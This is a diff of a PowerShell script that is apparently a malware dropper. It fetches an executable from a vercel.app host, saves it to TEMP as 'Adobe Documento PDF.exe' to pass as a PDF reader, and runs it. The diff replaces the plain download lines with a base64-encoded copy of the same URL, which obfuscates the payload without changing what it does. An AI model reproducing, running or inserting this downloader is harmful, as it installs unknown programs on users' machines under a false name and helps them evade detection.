@@ -1,5 +1,6 @@
-$u = 'https' + '://' + 'testando123-blond.vercel.app/Adobe%20-%20Leitor%20de%20PDF.exe'
-$n = [System.IO.Path]::Combine($env:TEMP, ('Adobe' + [char]32 + 'Documento' + [char]32 + 'PDF.exe'))
-$w = (New-Object Net.WebClient)
-$w.DownloadFile($u, $n)
-(Start-Process -FilePath $n)
+$e = [Text.Encoding]::UTF8
+$d = 'aHR0cHM6Ly90ZXN0YW5kbzEyMy1ibG9uZC52ZXJjZWwuYXBwL0Fkb2JlJTIwLSUyMExlaXRvciUyMGRlJTIwUERGLmV4ZQ=='
+$p = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d))
+$f = "$env:TEMP\Adobe Documento PDF.exe"
+(New-Object Net.WebClient).DownloadFile($p, $f)
+&($f)
